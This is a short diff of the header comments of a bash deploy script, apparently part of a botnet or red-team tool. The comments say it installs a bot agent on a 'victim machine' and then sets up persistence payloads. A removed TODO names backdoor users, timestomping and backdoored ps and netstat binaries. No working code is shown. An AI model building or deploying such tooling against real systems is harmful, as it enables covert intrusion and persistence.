@@ -1,7 +1,16 @@
 #!/bin/bash
 
 #
-#   TODO: Add backdoor users, Timestomping, ps + netstat binaries backdoor 
+#   Author: Sunggwan Choi 
+#   
+#   Description: deploy.sh will deploy the client.py(bot) agent to the victim 
+#   machie. After that, deploy.sh will deploy various persistence payloads 
+#   in order to establish persistence. 
+#
+#
+#
+#   TODO: Need to stop hardcoding. Less spaghetti in the code.
+#
 #
 
 # Change host and port before the deployment 
